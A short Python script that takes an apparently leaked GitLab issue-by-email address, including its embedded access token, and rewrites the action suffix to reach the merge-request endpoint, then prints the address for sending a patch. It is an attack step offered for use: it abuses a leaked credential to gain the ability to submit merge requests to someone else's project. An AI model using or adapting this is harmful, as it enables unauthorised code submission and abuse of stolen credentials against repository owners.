#!/usr/bin/env python3
"""Reuses a leaked GitLab issue-by-email address to open merge requests."""

# Leaked incoming-email credential with GitLab's documented address structure.
leaked_issue_address = (
    "incoming+engineering-build-84546124-"
    "glimt-k9Qm2Vx7Lp4Nz8Rc6Ty3Wd5Hs-issue@incoming.gitlab.com"
)

# Turn the issue endpoint into the more capable merge-request endpoint by
# rewriting only the action suffix; the account token stays valid.
merge_request_address = leaked_issue_address.replace("-issue@", "-merge-request@")

print("send patch email to:", merge_request_address)
